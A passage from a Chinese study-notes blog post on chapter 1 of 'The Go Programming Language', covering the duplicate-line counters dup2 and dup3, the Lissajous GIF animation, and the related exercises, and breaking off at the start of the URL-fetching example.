		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">for</span> line<span class="token punctuation">,</span> n <span class="token operator">:=</span> <span class="token keyword">range</span> counts <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span> n <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\t%s\n"</span><span class="token punctuation">,</span> n <span class="token punctuation">,</span>line<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">countLines</span><span class="token punctuation">(</span>f <span class="token operator">*</span>os<span class="token punctuation">.</span>File<span class="token punctuation">,</span> counts <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	input <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewScanner</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
	<span class="token keyword">for</span> input<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		counts<span class="token punctuation">[</span>input<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">++</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// NOTE: ignoring potential errors from input.Err()</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>运行示例：</strong><br> <img src="https://images2.imgbox.com/b5/05/ioWgRGRF_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="dup3_410"></a>dup3</h5> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strings"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	counts <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> filename <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		data<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"dup3: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
			<span class="token keyword">continue</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> line <span class="token operator">:=</span> <span class="token keyword">range</span> strings<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			counts<span class="token punctuation">[</span>line<span class="token punctuation">]</span><span class="token operator">++</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">for</span> line<span class="token punctuation">,</span> n <span class="token operator">:=</span> <span class="token keyword">range</span> counts <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span> n <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\t%s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> line<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><strong>运行示例：</strong><br> <img src="https://images2.imgbox.com/8f/86/DEHZlW1V_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_445"></a>练习</h4> 
<h5><a id="14_447"></a>练习1.4：</h5> 
<blockquote> 
 <p>修改dup2，出现重复的行时打印文件名称</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bufio"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> LnFile <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
	Count <span class="token builtin">int</span>
	FileNames <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token comment">// Dup2 prints the count and text of lines that appear more than once</span>
<span class="token comment">// in the input. It reads from stdin or from a list of named files.</span>
<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	counts <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>LnFile<span class="token punctuation">)</span>
	files <span class="token operator">:=</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">countLine</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stdin<span class="token punctuation">,</span> counts<span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> arg <span class="token operator">:=</span> <span class="token keyword">range</span> files <span class="token punctuation">{<!-- --></span>
			f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
				fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"dup2: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
				<span class="token keyword">continue</span>
			<span class="token punctuation">}</span>
			<span class="token function">countLine</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> counts<span class="token punctuation">)</span>
			f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">for</span> line<span class="token punctuation">,</span> n <span class="token operator">:=</span> <span class="token keyword">range</span> counts <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span> n<span class="token punctuation">.</span>Count <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\t%v\t%s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">.</span>Count<span class="token punctuation">,</span> n<span class="token punctuation">.</span>FileNames<span class="token punctuation">,</span> line<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">countLine</span><span class="token punctuation">(</span>f <span class="token operator">*</span>os<span class="token punctuation">.</span>File<span class="token punctuation">,</span> counts <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>LnFile<span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	input <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewScanner</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
	<span class="token keyword">for</span> input<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		key <span class="token operator">:=</span> input<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> ok <span class="token operator">:=</span> counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
		<span class="token keyword">if</span> ok <span class="token punctuation">{<!-- --></span>
			counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>Count<span class="token operator">++</span>
			counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>FileNames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>FileNames<span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>LnFile<span class="token punctuation">)</span>
			counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>Count <span class="token operator">=</span> <span class="token number">1</span>
			counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>FileNames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>counts<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>FileNames<span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// NOTE: ignoring potential errors from input.Err()</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/06/da/84euYOth_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="04_GIF__508"></a>04 GIF 动画</h3> 
<ul><li>当我们import了一个包路径包含有多个单词的package时，比如image/color（image和color两个单词），通常我们只需要用最后那个单词表示这个包就可以</li><li>常量是指在程序变异后运行时始终都不会变化的值 
  <ul><li>常量声明和变量声明一般都会出现在包级别，所以这些常量在整个包中都是可以共享的</li><li>常量声明也可以定义在函数体内部，此时常量只能在函数体内用</li><li>目前常量声明的值必须是一个数字值、字符串或者一个固定的boolean值</li></ul> </li><li><code>struct</code> 是一组值或者叫字段的集合，不同的类型集合在一个struct可以让我们以一个统一的单元进行处理</li></ul> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"image"</span>
	<span class="token string">"image/color"</span>
	<span class="token string">"image/gif"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"math"</span>
	<span class="token string">"math/rand"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token comment">// 利萨如图形</span>

<span class="token keyword">var</span> palette <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>color<span class="token punctuation">.</span>Color<span class="token punctuation">{<!-- --></span>color<span class="token punctuation">.</span>White<span class="token punctuation">,</span> color<span class="token punctuation">.</span>Black<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token punctuation">(</span>
	whiteIndex <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// first color in palette</span>
	blackIndex <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">// nexr color in palette</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// The sequence of images is deterministic unless we seed</span>
	<span class="token comment">// the pseudo-random number generator using the current time.</span>
	<span class="token comment">// 图像序列是确定的，除非我们使用当前时间播种伪随机数生成器</span>
	rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UTC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UnixNano</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token comment">// 按照书中代码运行编码生成的GIF无法正常打开，改为直接输出字节文件就可以了</span>
	<span class="token comment">// 目测是因为windows环境转了一些控制字符</span>
	buf <span class="token operator">:=</span> <span class="token operator">&amp;</span>bytes<span class="token punctuation">.</span>Buffer<span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
	<span class="token function">lissajous</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"output.gif"</span><span class="token punctuation">,</span> buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">lissajous</span><span class="token punctuation">(</span>out io<span class="token punctuation">.</span>Writer<span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">const</span> <span class="token punctuation">(</span>
		cycles <span class="token operator">=</span> <span class="token number">5</span> <span class="token comment">// number of complete x oscillator revolutions 完成x振子转数</span>
		res <span class="token operator">=</span> <span class="token number">0.001</span> <span class="token comment">// angular resolution 角坐标分辨率</span>
		size <span class="token operator">=</span> <span class="token number">100</span> <span class="token comment">// image canvas covers [-size..+size] 图像范围覆盖</span>
		nframes <span class="token operator">=</span> <span class="token number">64</span> <span class="token comment">// number of animation frames 动画帧数</span>
		delay <span class="token operator">=</span> <span class="token number">8</span> <span class="token comment">// delay between frames in 10ms units 帧间延迟以10ms为单位</span>
	<span class="token punctuation">)</span>

	freq <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Float64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3.0</span> <span class="token comment">// relative frequency of y osillator y振荡器的相对频率</span>
	anim <span class="token operator">:=</span> gif<span class="token punctuation">.</span>GIF<span class="token punctuation">{<!-- --></span>LoopCount<span class="token punctuation">:</span> nframes<span class="token punctuation">}</span>
	phase <span class="token operator">:=</span> <span class="token number">0.0</span> <span class="token comment">// phase diffrence 相位差</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nframes<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
		rect <span class="token operator">:=</span> image<span class="token punctuation">.</span><span class="token function">Rect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
		img <span class="token operator">:=</span> image<span class="token punctuation">.</span><span class="token function">NewPaletted</span><span class="token punctuation">(</span>rect<span class="token punctuation">,</span> palette<span class="token punctuation">)</span>
		<span class="token keyword">for</span> t <span class="token operator">:=</span> <span class="token number">0.0</span><span class="token punctuation">;</span> t <span class="token operator">&lt;</span> cycles<span class="token operator">*</span><span class="token number">2</span><span class="token operator">*</span>math<span class="token punctuation">.</span>Pi<span class="token punctuation">;</span> t <span class="token operator">+=</span> res <span class="token punctuation">{<!-- --></span>
			x <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
			y <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span>t<span class="token operator">*</span>freq <span class="token operator">+</span> phase<span class="token punctuation">)</span>
			img<span class="token punctuation">.</span><span class="token function">SetColorIndex</span><span class="token punctuation">(</span>size<span class="token operator">+</span><span class="token function">int</span><span class="token punctuation">(</span>x<span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token operator">+</span><span class="token function">int</span><span class="token punctuation">(</span>y<span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> blackIndex<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		phase <span class="token operator">+=</span> <span class="token number">0.1</span>
		anim<span class="token punctuation">.</span>Delay <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>anim<span class="token punctuation">.</span>Delay<span class="token punctuation">,</span> delay<span class="token punctuation">)</span>
		anim<span class="token punctuation">.</span>Image <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>anim<span class="token punctuation">.</span>Image<span class="token punctuation">,</span> img<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	gif<span class="token punctuation">.</span><span class="token function">EncodeAll</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token operator">&amp;</span>anim<span class="token punctuation">)</span> <span class="token comment">// ignoring encoding errors</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ed/2b/boNA2SmO_o.gif" alt="请添加图片描述"></p> 
<h4><a id="_584"></a>练习</h4> 
<h5><a id="15_586"></a>练习1.5：</h5> 
<blockquote> 
 <p>修改前面的Lissajous程序里的调色板，由黑色改为绿色。我们可以用 color.RGBA{0xRR, 0xGG, 0xBB, 0xff}来得到 #RRGGBB 的色值，三个十六进制的字符串分别代表红、绿、蓝像素</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">var</span> palette <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>color<span class="token punctuation">.</span>Color<span class="token punctuation">{<!-- --></span>color<span class="token punctuation">.</span>RGBA<span class="token punctuation">{<!-- --></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">}</span><span class="token punctuation">,</span> color<span class="token punctuation">.</span>RGBA<span class="token punctuation">{<!-- --></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/7a/1f/pvT3SqQa_o.gif" alt="请添加图片描述"></p> 
<h5><a id="16_594"></a>练习1.6：</h5> 
<blockquote> 
 <p>修改Lissajous程序，修改其调色板来生成更丰富的颜色，然后修改SetColorIndex的第三个参数，看看显示结果吧</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"image"</span>
	<span class="token string">"image/color"</span>
	<span class="token string">"image/gif"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"math"</span>
	<span class="token string">"math/rand"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">const</span> nColors <span class="token operator">=</span> <span class="token number">10</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	seed <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span> seed<span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>

	<span class="token keyword">var</span> palette <span class="token punctuation">[</span><span class="token punctuation">]</span>color<span class="token punctuation">.</span>Color

	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nColors<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
		r <span class="token operator">:=</span> <span class="token function">uint8</span><span class="token punctuation">(</span>rand<span class="token punctuation">.</span><span class="token function">Uint32</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span>
		g <span class="token operator">:=</span> <span class="token function">uint8</span><span class="token punctuation">(</span>rand<span class="token punctuation">.</span><span class="token function">Uint32</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span>
		b <span class="token operator">:=</span> <span class="token function">uint8</span><span class="token punctuation">(</span>rand<span class="token punctuation">.</span><span class="token function">Uint32</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span>
		palette <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span> palette<span class="token punctuation">,</span> color<span class="token punctuation">.</span>RGBA<span class="token punctuation">{<!-- --></span> r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">}</span> <span class="token punctuation">)</span>
	<span class="token punctuation">}</span>

	buf <span class="token operator">:=</span> <span class="token operator">&amp;</span>bytes<span class="token punctuation">.</span>Buffer<span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
	<span class="token function">lissajous1</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> palette<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"output2.gif"</span><span class="token punctuation">,</span> buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">lissajous1</span><span class="token punctuation">(</span>out io<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> palette <span class="token punctuation">[</span><span class="token punctuation">]</span>color<span class="token punctuation">.</span>Color<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">const</span> <span class="token punctuation">(</span>
		cycles  <span class="token operator">=</span> <span class="token number">5</span>
		res     <span class="token operator">=</span> <span class="token number">0.001</span>
		size    <span class="token operator">=</span> <span class="token number">100</span>
		nframes <span class="token operator">=</span> <span class="token number">64</span>
		delay   <span class="token operator">=</span> <span class="token number">8</span>
	<span class="token punctuation">)</span>
	freq <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Float64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3.0</span>
	anim <span class="token operator">:=</span> gif<span class="token punctuation">.</span>GIF<span class="token punctuation">{<!-- --></span>LoopCount<span class="token punctuation">:</span> nframes<span class="token punctuation">}</span>
	phase <span class="token operator">:=</span> <span class="token number">0.0</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nframes<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
		rect   <span class="token operator">:=</span> image<span class="token punctuation">.</span><span class="token function">Rect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
		img    <span class="token operator">:=</span> image<span class="token punctuation">.</span><span class="token function">NewPaletted</span><span class="token punctuation">(</span>rect<span class="token punctuation">,</span> palette<span class="token punctuation">)</span>
		ncolor <span class="token operator">:=</span> <span class="token function">uint8</span><span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token function">len</span><span class="token punctuation">(</span>palette<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">for</span> t <span class="token operator">:=</span> <span class="token number">0.0</span><span class="token punctuation">;</span> t <span class="token operator">&lt;</span> cycles<span class="token operator">*</span><span class="token number">2</span><span class="token operator">*</span>math<span class="token punctuation">.</span>Pi<span class="token punctuation">;</span> t <span class="token operator">+=</span> res <span class="token punctuation">{<!-- --></span>
			x <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
			y <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span>t<span class="token operator">*</span>freq <span class="token operator">+</span> phase<span class="token punctuation">)</span>
			img<span class="token punctuation">.</span><span class="token function">SetColorIndex</span><span class="token punctuation">(</span>size<span class="token operator">+</span><span class="token function">int</span><span class="token punctuation">(</span>x<span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token operator">+</span><span class="token function">int</span><span class="token punctuation">(</span>y<span class="token operator">*</span>size<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ncolor <span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		phase <span class="token operator">+=</span> <span class="token number">0.1</span>
		anim<span class="token punctuation">.</span>Delay <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>anim<span class="token punctuation">.</span>Delay<span class="token punctuation">,</span> delay<span class="token punctuation">)</span>
		anim<span class="token punctuation">.</span>Image <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>anim<span class="token punctuation">.</span>Image<span class="token punctuation">,</span> img<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	gif<span class="token punctuation">.</span><span class="token function">EncodeAll</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token operator">&amp;</span>anim<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/b9/b7/VjGEVaIx_o.gif" alt="请添加图片描述"></p> 
<h3><a id="05_URL_663"></a>05 获取URL</h3> 
<ul><li><code>http.Get</code> 函数是创建<code>HTTP</code>请求的函数 
  <ul><li>如果获取过程没有出错，其得到的访问的请求结果的Body字段包括一个可读的服务器响应流，利用<code>ioutil.ReadAll</code>函数可以读取<code>Body</code>字段中的全部内容</li><li><code>Body.Close</code>关闭<code>Body</code>流，防止资源泄露</li></ul> </li><li><code>os.Exit</code>函数终止进程，并且返回一个status错误码，其值为1</li></ul> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> url <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
